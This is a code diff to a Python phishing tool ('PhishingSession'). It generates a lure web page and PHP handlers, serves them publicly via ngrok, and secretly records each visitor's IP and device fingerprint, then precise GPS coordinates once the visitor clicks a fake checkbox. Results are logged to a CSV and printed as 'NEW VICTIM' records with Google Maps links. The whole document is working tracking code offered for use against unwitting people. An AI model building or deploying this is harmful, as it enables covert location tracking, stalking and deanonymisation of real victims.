@@ -32,18 +32,46 @@ def header():
                                            BY SUPERXEON                                                                        
 ''')
 
-def setup_handlers():
-    """Setup permanent handlers and logs in script directory"""
-    # Create handlers directory in script folder
-    handlers_dir = SCRIPT_DIR / 'handlers'
-    handlers_dir.mkdir(exist_ok=True)
-    
-    # Create logs directory in script folder (PERMANENT)
+def setup_directories():
+    """Setup permanent logs directory"""
     logs_dir = SCRIPT_DIR / 'logs'
     logs_dir.mkdir(exist_ok=True)
-    
-    # info_handler.php
-    info_handler = '''<?php
+    db_dir = SCRIPT_DIR / 'db'
+    db_dir.mkdir(exist_ok=True)
+    return logs_dir, db_dir
+
+class PhishingSession:
+    def __init__(self, redirect_url, port=8080):
+        self.redirect_url = redirect_url
+        self.port = port
+        self.temp_dir = None
+        self.logs_dir = None
+        self.db_dir = None
+        self.process = None
+        self.victims_count = 0
+        
+    def generate_files(self):
+        """Generate HTML and PHP handlers in temp directory"""
+        # Setup permanent directories
+        self.logs_dir, self.db_dir = setup_directories()
+        
+        # Clear old logs
+        for log_file in ['info.txt', 'result.txt', 'error.txt', 'maps.txt']:
+            log_path = self.logs_dir / log_file
+            if log_path.exists():
+                log_path.unlink()
+            log_path.touch()
+        
+        # Create temp directory
+        self.temp_dir = Path(tempfile.mkdtemp(prefix='phishing_'))
+        
+        # Get absolute path for logs (for PHP handlers)
+        logs_absolute = str(self.logs_dir.absolute()).replace('\\', '/')
+        
+        # ===== PHP HANDLERS =====
+        
+        # info_handler.php
+        info_handler = f'''<?php
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 
@@ -52,14 +80,14 @@ $data['ip'] = $_SERVER['REMOTE_ADDR'];
 $data['timestamp'] = date('Y-m-d H:i:s');
 $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
 
-$logFile = '../logs/info.txt';
+$logFile = '{logs_absolute}/info.txt';
 file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);
 
 echo json_encode(['status' => 'success']);
 ?>'''
-    
-    # result_handler.php
-    result_handler = '''<?php
+        
+        # result_handler.php
+        result_handler = f'''<?php
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 
@@ -67,21 +95,21 @@ $data = $_POST;
 $data['ip'] = $_SERVER['REMOTE_ADDR'];
 $data['timestamp'] = date('Y-m-d H:i:s');
 
-$logFile = '../logs/result.txt';
+$logFile = '{logs_absolute}/result.txt';
 file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);
 
-if (isset($data['lat']) && isset($data['lon'])) {
-    $lat = str_replace(' deg', '', $data['lat']);
-    $lon = str_replace(' deg', '', $data['lon']);
-    $mapsUrl = "https://www.google.com/maps/place/{$lat}+{$lon}";
-    file_put_contents('../logs/maps.txt', $mapsUrl . "\\n", FILE_APPEND);
-}
+if (isset($data['Lat']) && isset($data['Lon'])) {{
+    $lat = str_replace(' deg', '', $data['Lat']);
+    $lon = str_replace(' deg', '', $data['Lon']);
+    $mapsUrl = "https://www.google.com/maps/place/{{$lat}}+{{$lon}}";
+    file_put_contents('{logs_absolute}/maps.txt', $mapsUrl . "\\n", FILE_APPEND);
+}}
 
 echo json_encode(['status' => 'success']);
 ?>'''
-    
-    # error_handler.php
-    error_handler = '''<?php
+        
+        # error_handler.php
+        error_handler = f'''<?php
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 
@@ -89,38 +117,18 @@ $data = $_POST;
 $data['ip'] = $_SERVER['REMOTE_ADDR'];
 $data['timestamp'] = date('Y-m-d H:i:s');
 
-$logFile = '../logs/error.txt';
+$logFile = '{logs_absolute}/error.txt';
 file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);
 
 echo json_encode(['status' => 'error']);
 ?>'''
-    
-    # Write handlers (PERMANENT)
-    (handlers_dir / 'info_handler.php').write_text(info_handler, encoding='utf-8')
-    (handlers_dir / 'result_handler.php').write_text(result_handler, encoding='utf-8')
-    (handlers_dir / 'error_handler.php').write_text(error_handler, encoding='utf-8')
-    
-    return handlers_dir, logs_dir
-
-class PhishingSession:
-    def __init__(self, redirect_url, port=8080):
-        self.redirect_url = redirect_url
-        self.port = port
-        self.temp_dir = None
-        self.handlers_dir = None
-        self.logs_dir = None
-        self.process = None
-        self.victims_count = 0
         
-    def generate_files(self):
-        """Generate HTML in temp, link to permanent handlers"""
-        # Setup permanent handlers and logs
-        self.handlers_dir, self.logs_dir = setup_handlers()
+        # Write PHP handlers to temp directory (same level as index.html)
+        (self.temp_dir / 'info_handler.php').write_text(info_handler, encoding='utf-8')
+        (self.temp_dir / 'result_handler.php').write_text(result_handler, encoding='utf-8')
+        (self.temp_dir / 'error_handler.php').write_text(error_handler, encoding='utf-8')
         
-        # Create temp directory for HTML only
-        self.temp_dir = Path(tempfile.mkdtemp(prefix='phishing_'))
-        
-        # HTML Website
+        # ===== HTML WEBSITE =====
         website = '''<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -182,39 +190,146 @@ class PhishingSession:
         function collectDeviceInfo() {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            let vendor = 'N/A', renderer = 'N/A';
+            let ven = 'Not Available', ren = 'Not Available';
+            
             if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                try {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch(e) {
+                    console.log('GPU info not available');
                 }
             }
+            
             const ua = navigator.userAgent;
-            let browser = 'Unknown';
-            if (ua.indexOf('Firefox') > -1) browser = ua.substring(ua.indexOf('Firefox/'));
-            else if (ua.indexOf('Chrome') > -1) browser = ua.substring(ua.indexOf('Chrome/'));
-            else if (ua.indexOf('Safari') > -1) browser = ua.substring(ua.indexOf('Safari/'));
-            const osMatch = ua.match(/\\(([^)]+)\\)/);
-            const os = osMatch ? osMatch[1].split(';')[1]?.trim() : 'Unknown';
-            return { platform: navigator.platform, cores: navigator.hardwareConcurrency || 'N/A', ram: navigator.deviceMemory || 'N/A', vendor: vendor, renderer: renderer, width: screen.width, height: screen.height, browser: browser, os: os, userAgent: ua, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
+            let brw = 'Not Available';
+            let str = ua;
+            
+            if (ua.indexOf('Firefox') != -1) {
+                str = str.substring(str.indexOf(' Firefox/') + 1);
+                str = str.split(' ');
+                brw = str[0];
+            }
+            else if (ua.indexOf('Chrome') != -1) {
+                str = str.substring(str.indexOf(' Chrome/') + 1);
+                str = str.split(' ');
+                brw = str[0];
+            }
+            else if (ua.indexOf('Safari') != -1) {
+                str = str.substring(str.indexOf(' Safari/') + 1);
+                str = str.split(' ');
+                brw = str[0];
+            }
+            else if (ua.indexOf('Edge') != -1) {
+                str = str.substring(str.indexOf(' Edge/') + 1);
+                str = str.split(' ');
+                brw = str[0];
+            }
+            
+            let os = ua;
+            os = os.substring(0, os.indexOf(')'));
+            os = os.split(';');
+            os = os[1];
+            if (os == undefined) {
+                os = 'Not Available';
+            }
+            os = os.trim();
+            
+            return {
+                Ptf: navigator.platform,
+                Brw: brw,
+                Cc: navigator.hardwareConcurrency || 'Not Available',
+                Ram: navigator.deviceMemory || 'Not Available',
+                Ven: ven,
+                Ren: ren,
+                Ht: screen.height,
+                Wd: screen.width,
+                Os: os
+            };
         }
         
-        function sendDeviceInfo(data) { $.ajax({ type: 'POST', url: 'handlers/info_handler.php', data: data }); }
-        function sendLocation(lat, lon, acc, alt, dir, spd) { $.ajax({ type: 'POST', url: 'handlers/result_handler.php', data: { status: 'success', lat: lat + ' deg', lon: lon + ' deg', acc: acc + ' m', alt: (alt || 'N/A') + ' m', dir: (dir || 'N/A') + ' deg', spd: (spd || 'N/A') + ' m/s', timestamp: new Date().toISOString() } }); }
-        function sendError(errorMsg) { $.ajax({ type: 'POST', url: 'handlers/error_handler.php', data: { status: 'failed', error: errorMsg, timestamp: new Date().toISOString() } }); }
+        function sendDeviceInfo(data) { 
+            $.ajax({ 
+                type: 'POST', 
+                url: 'info_handler.php', 
+                data: data,
+                success: function(response) {
+                    console.log('[OK] Device info sent');
+                },
+                error: function(xhr, status, error) {
+                    console.error('[ERROR] Failed to send device info:', error);
+                }
+            }); 
+        }
         
-        window.addEventListener('load', () => { sendDeviceInfo(collectDeviceInfo()); });
+        function sendLocation(lat, lon, acc, alt, dir, spd) { 
+            console.log('[DEBUG] Sending location:', lat, lon);
+            $.ajax({ 
+                type: 'POST', 
+                url: 'result_handler.php', 
+                data: { 
+                    Status: 'success',
+                    Lat: lat,
+                    Lon: lon,
+                    Acc: acc,
+                    Alt: alt,
+                    Dir: dir,
+                    Spd: spd
+                },
+                success: function(response) {
+                    console.log('[OK] Location sent successfully');
+                },
+                error: function(xhr, status, error) {
+                    console.error('[ERROR] Failed to send location:', error);
+                }
+            }); 
+        }
+        
+        function sendError(errorMsg) { 
+            console.log('[DEBUG] Sending error:', errorMsg);
+            $.ajax({ 
+                type: 'POST', 
+                url: 'error_handler.php', 
+                data: { 
+                    Status: 'failed',
+                    Error: errorMsg
+                },
+                success: function(response) {
+                    console.log('[OK] Error logged');
+                },
+                error: function(xhr, status, error) {
+                    console.error('[ERROR] Failed to send error:', error);
+                }
+            }); 
+        }
+        
+        window.addEventListener('load', () => { 
+            sendDeviceInfo(collectDeviceInfo()); 
+        });
         
         container.addEventListener('click', function () {
             if (checkbox.classList.contains('checked')) return;
+            
             if (navigator.geolocation) {
                 spinner.classList.add('active');
                 container.style.cursor = 'default';
+                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
-                        sendLocation(latitude, longitude, accuracy, altitude, heading, speed);
+                        
+                        let lat = latitude ? latitude + ' deg' : 'Not Available';
+                        let lon = longitude ? longitude + ' deg' : 'Not Available';
+                        let acc = accuracy ? accuracy + ' m' : 'Not Available';
+                        let alt = altitude ? altitude + ' m' : 'Not Available';
+                        let dir = heading ? heading + ' deg' : 'Not Available';
+                        let spd = speed ? speed + ' m/s' : 'Not Available';
+                        
+                        sendLocation(lat, lon, acc, alt, dir, spd);
+                        
                         setTimeout(() => {
                             spinner.classList.remove('active');
                             checkbox.classList.add('checked');
@@ -228,17 +343,31 @@ class PhishingSession:
                     (error) => {
                         spinner.classList.remove('active');
                         container.style.cursor = 'pointer';
+                        
                         let errorMsg = '';
                         switch (error.code) {
-                            case error.PERMISSION_DENIED: errorMsg = 'Location permission denied'; break;
-                            case error.POSITION_UNAVAILABLE: errorMsg = 'Location unavailable'; break;
-                            case error.TIMEOUT: errorMsg = 'Location timeout'; break;
-                            default: errorMsg = 'Unknown error';
+                            case error.PERMISSION_DENIED: 
+                                errorMsg = 'User denied the request for Geolocation'; 
+                                break;
+                            case error.POSITION_UNAVAILABLE: 
+                                errorMsg = 'Location information is unavailable'; 
+                                break;
+                            case error.TIMEOUT: 
+                                errorMsg = 'The request to get user location timed out'; 
+                                break;
+                            default: 
+                                errorMsg = 'An unknown error occurred';
                         }
+                        
                         sendError(errorMsg);
-                        alert(errorMsg + '. Please enable location.');
+                        alert(errorMsg + '. Redirecting anyway...');
+                        setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 30000,
+                        maximumAge: 0 
+                    }
                 );
             }
         });
@@ -251,20 +380,15 @@ class PhishingSession:
         # Write HTML to temp
         (self.temp_dir / 'index.html').write_text(website, encoding='utf-8')
         
-        # Copy handlers to temp (so PHP server can access it)
-        handlers_temp = self.temp_dir / 'handlers'
-        shutil.copytree(self.handlers_dir, handlers_temp)
-        
         print("\n[+] Files generated")
         print("[*] HTML: " + str(self.temp_dir))
-        print("[*] Handlers: " + str(self.handlers_dir))
-        print("[*] Logs will be saved to: " + str(self.logs_dir))
+        print("[*] Logs: " + str(self.logs_dir))
         
     def start_server(self):
         """Start PHP server"""
         cmd = ['php', '-S', f'0.0.0.0:{self.port}', '-t', str(self.temp_dir)]
         self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(1)
+        time.sleep(2)
         print("\n[+] Server started: http://localhost:" + str(self.port))
         print("[*] Redirect URL: " + self.redirect_url)
         
@@ -272,12 +396,15 @@ class PhishingSession:
         """Monitor log files for new victims - REAL TIME"""
         info_log = self.logs_dir / 'info.txt'
         result_log = self.logs_dir / 'result.txt'
+        error_log = self.logs_dir / 'error.txt'
         
-        # Track what we've already displayed
         info_lines_shown = 0
         result_lines_shown = 0
+        error_lines_shown = 0
         
-        print("[*] Monitoring started... Waiting for victims...")
+        print("[*] Real-time monitoring active...")
+        print("[*] Logs location: " + str(self.logs_dir))
+        print("[*] Waiting for victims...\n")
         
         while monitoring:
             try:
@@ -286,14 +413,16 @@ class PhishingSession:
                     with open(info_log, 'r', encoding='utf-8') as f:
                         lines = f.readlines()
                         if len(lines) > info_lines_shown:
-                            # Display new lines
                             for i in range(info_lines_shown, len(lines)):
-                                try:
-                                    data = json.loads(lines[i].strip())
-                                    self.victims_count = i + 1
-                                    self.display_victim_info(data)
-                                except:
-                                    pass
+                                line = lines[i].strip()
+                                if line:
+                                    try:
+                                        data = json.loads(line)
+                                        self.victims_count += 1
+                                        self.display_victim_info(data)
+                                        self.save_to_csv(data, None)
+                                    except json.JSONDecodeError:
+                                        pass
                             info_lines_shown = len(lines)
                 
                 # Check result log
@@ -301,71 +430,159 @@ class PhishingSession:
                     with open(result_log, 'r', encoding='utf-8') as f:
                         lines = f.readlines()
                         if len(lines) > result_lines_shown:
-                            # Display new lines
                             for i in range(result_lines_shown, len(lines)):
-                                try:
-                                    data = json.loads(lines[i].strip())
-                                    self.display_location_info(data)
-                                except:
-                                    pass
+                                line = lines[i].strip()
+                                if line:
+                                    try:
+                                        data = json.loads(line)
+                                        self.display_location_info(data)
+                                        self.save_to_csv(None, data)
+                                    except json.JSONDecodeError:
+                                        pass
                             result_lines_shown = len(lines)
                 
-                time.sleep(0.3)  # Check every 300ms for real-time feel
+                # Check error log
+                if error_log.exists():
+                    with open(error_log, 'r', encoding='utf-8') as f:
+                        lines = f.readlines()
+                        if len(lines) > error_lines_shown:
+                            for i in range(error_lines_shown, len(lines)):
+                                line = lines[i].strip()
+                                if line:
+                                    try:
+                                        data = json.loads(line)
+                                        self.display_error_info(data)
+                                    except json.JSONDecodeError:
+                                        pass
+                            error_lines_shown = len(lines)
+                
+                time.sleep(0.2)
+                
             except Exception as e:
-                pass
+                print("[!] Monitor error: " + str(e))
+                time.sleep(1)
     
     def display_victim_info(self, data):
         """Display victim device info"""
-        print("\n" + "="*70)
-        print("[+] NEW VICTIM #" + str(self.victims_count) + " - " + str(data.get('timestamp', 'N/A')))
-        print("="*70)
-        print("[DEVICE INFO]")
-        print("   IP Address  : " + str(data.get('ip', 'N/A')))
-        print("   OS          : " + str(data.get('os', 'N/A')))
-        print("   Platform    : " + str(data.get('platform', 'N/A')))
-        print("   Browser     : " + str(data.get('browser', 'N/A')))
-        print("   CPU Cores   : " + str(data.get('cores', 'N/A')))
-        print("   RAM         : " + str(data.get('ram', 'N/A')) + " GB")
-        print("   GPU Vendor  : " + str(data.get('vendor', 'N/A')))
-        print("   GPU Render  : " + str(data.get('renderer', 'N/A')))
-        print("   Screen      : " + str(data.get('width', 'N/A')) + "x" + str(data.get('height', 'N/A')))
-        print("   Language    : " + str(data.get('language', 'N/A')))
-        print("   Timezone    : " + str(data.get('timezone', 'N/A')))
-        ua = str(data.get('userAgent', 'N/A'))
-        if len(ua) > 80:
-            ua = ua[:77] + "..."
-        print("   User Agent  : " + ua)
-        print("="*70)
-        print("\n[*] Waiting for location permission...")
-        sys.stdout.flush()  # Force immediate display
+        try:
+            print("\n" + "="*70)
+            print("[+] NEW VICTIM #" + str(self.victims_count))
+            print("[+] Time: " + str(data.get('timestamp', 'N/A')))
+            print("="*70)
+            print("\n[!] Device Information:")
+            print("")
+            print("[+] IP Address   : " + str(data.get('ip', 'N/A')))
+            print("[+] OS           : " + str(data.get('Os', 'N/A')))
+            print("[+] Platform     : " + str(data.get('Ptf', 'N/A')))
+            print("[+] Browser      : " + str(data.get('Brw', 'N/A')))
+            print("[+] CPU Cores    : " + str(data.get('Cc', 'N/A')))
+            print("[+] RAM          : " + str(data.get('Ram', 'N/A')) + " GB")
+            print("[+] GPU Vendor   : " + str(data.get('Ven', 'N/A')))
+            print("[+] GPU Renderer : " + str(data.get('Ren', 'N/A')))
+            print("[+] Resolution   : " + str(data.get('Wd', 'N/A')) + "x" + str(data.get('Ht', 'N/A')))
+            
+            print("\n" + "="*70)
+            print("[*] Waiting for victim to allow location access...")
+            print("="*70 + "\n")
+            
+        except Exception as e:
+            print("[!] Display error: " + str(e))
+        
+        sys.stdout.flush()
     
     def display_location_info(self, data):
         """Display victim location"""
-        print("\n" + "="*70)
-        print("[!] LOCATION CAPTURED! - " + str(data.get('timestamp', 'N/A')))
-        print("="*70)
-        print("[GPS COORDINATES]")
-        print("   Latitude    : " + str(data.get('lat', 'N/A')))
-        print("   Longitude   : " + str(data.get('lon', 'N/A')))
-        print("   Accuracy    : " + str(data.get('acc', 'N/A')))
-        print("   Altitude    : " + str(data.get('alt', 'N/A')))
-        print("   Direction   : " + str(data.get('dir', 'N/A')))
-        print("   Speed       : " + str(data.get('spd', 'N/A')))
+        try:
+            print("\n" + "="*70)
+            print("[!] LOCATION CAPTURED!")
+            print("[+] Time: " + str(data.get('timestamp', 'N/A')))
+            print("="*70)
+            print("\n[!] Location Information:")
+            print("")
+            print("[+] Latitude     : " + str(data.get('Lat', 'N/A')))
+            print("[+] Longitude    : " + str(data.get('Lon', 'N/A')))
+            print("[+] Accuracy     : " + str(data.get('Acc', 'N/A')))
+            print("[+] Altitude     : " + str(data.get('Alt', 'N/A')))
+            print("[+] Direction    : " + str(data.get('Dir', 'N/A')))
+            print("[+] Speed        : " + str(data.get('Spd', 'N/A')))
+            
+            lat = str(data.get('Lat', '')).replace(' deg', '').strip()
+            lon = str(data.get('Lon', '')).replace(' deg', '').strip()
+            
+            if lat and lon and lat != 'N/A' and lon != 'Not Available':
+                maps_url = "https://www.google.com/maps/place/" + lat + "+" + lon
+                print("")
+                print("[+] Google Maps  : " + maps_url)
+            
+            print("\n" + "="*70)
+            print("[+] All data saved to: " + str(self.logs_dir))
+            print("="*70 + "\n")
+            
+        except Exception as e:
+            print("[!] Display error: " + str(e))
         
-        # Generate Google Maps URL
-        lat = str(data.get('lat', '')).replace(' deg', '')
-        lon = str(data.get('lon', '')).replace(' deg', '')
-        if lat and lon:
-            maps_url = "https://www.google.com/maps/place/" + lat + "+" + lon
-            print("\n[GOOGLE MAPS]")
-            print("   " + maps_url)
-        print("="*70)
-        print("[+] Full data saved to: " + str(self.logs_dir))
-        print("="*70 + "\n")
-        sys.stdout.flush()  # Force immediate display
+        sys.stdout.flush()
+    
+    def display_error_info(self, data):
+        """Display error info"""
+        try:
+            print("\n" + "="*70)
+            print("[!] ERROR FROM VICTIM")
+            print("[+] Time: " + str(data.get('timestamp', 'N/A')))
+            print("="*70)
+            print("\n[-] Error: " + str(data.get('Error', 'Unknown error')))
+            print("\n" + "="*70 + "\n")
+        except Exception as e:
+            print("[!] Display error: " + str(e))
+        
+        sys.stdout.flush()
+    
+    def save_to_csv(self, info_data, location_data):
+        """Save data to CSV like Seeker"""
+        try:
+            csv_file = self.db_dir / 'results.csv'
+            
+            # Create CSV if not exists
+            if not csv_file.exists():
+                with open(csv_file, 'w', encoding='utf-8') as f:
+                    f.write('OS,Platform,CPU_Cores,RAM,GPU_Vendor,GPU_Renderer,Resolution,Browser,IP,Latitude,Longitude,Accuracy,Altitude,Direction,Speed,Timestamp\n')
+            
+            # Build row
+            row = []
+            
+            if info_data:
+                row.append(str(info_data.get('Os', 'N/A')))
+                row.append(str(info_data.get('Ptf', 'N/A')))
+                row.append(str(info_data.get('Cc', 'N/A')))
+                row.append(str(info_data.get('Ram', 'N/A')))
+                row.append(str(info_data.get('Ven', 'N/A')))
+                row.append(str(info_data.get('Ren', 'N/A')))
+                row.append(str(info_data.get('Wd', 'N/A')) + 'x' + str(info_data.get('Ht', 'N/A')))
+                row.append(str(info_data.get('Brw', 'N/A')))
+                row.append(str(info_data.get('ip', 'N/A')))
+            else:
+                row.extend(['N/A'] * 9)
+            
+            if location_data:
+                row.append(str(location_data.get('Lat', 'N/A')))
+                row.append(str(location_data.get('Lon', 'N/A')))
+                row.append(str(location_data.get('Acc', 'N/A')))
+                row.append(str(location_data.get('Alt', 'N/A')))
+                row.append(str(location_data.get('Dir', 'N/A')))
+                row.append(str(location_data.get('Spd', 'N/A')))
+                row.append(str(location_data.get('timestamp', 'N/A')))
+            else:
+                row.extend(['N/A'] * 7)
+            
+            # Write row
+            with open(csv_file, 'a', encoding='utf-8') as f:
+                f.write(','.join(['"' + str(x).replace('"', '""') + '"' for x in row]) + '\n')
+                
+        except Exception as e:
+            print("[!] CSV save error: " + str(e))
     
     def cleanup(self):
-        """Stop server and clean up temp only"""
+        """Stop server and clean up"""
         global monitoring
         monitoring = False
         
@@ -374,10 +591,9 @@ class PhishingSession:
             self.process.wait()
             print("\n[*] Server stopped")
         
-        # Only remove temp HTML directory
         if self.temp_dir and self.temp_dir.exists():
             shutil.rmtree(self.temp_dir)
-            print("[*] Cleaned temp HTML: " + str(self.temp_dir))
+            print("[*] Cleaned temp files")
         
         print("[+] All logs saved permanently in: " + str(self.logs_dir))
 
@@ -406,7 +622,6 @@ def forward_link():
         current_session.generate_files()
         current_session.start_server()
         
-        # Start monitoring in background
         monitoring = True
         monitor_thread = threading.Thread(target=current_session.monitor_logs, daemon=True)
         monitor_thread.start()
@@ -421,7 +636,6 @@ def forward_link():
         print("   Example: ngrok http " + str(port))
         print("\n" + "="*60 + "\n")
         
-        # Keep running
         try:
             while True:
                 time.sleep(1)
@@ -432,6 +646,8 @@ def forward_link():
             
     except Exception as e:
         print("\n[!] Error: " + str(e))
+        import traceback
+        traceback.print_exc()
         if current_session:
             current_session.cleanup()
         input("\nPress Enter to continue...")
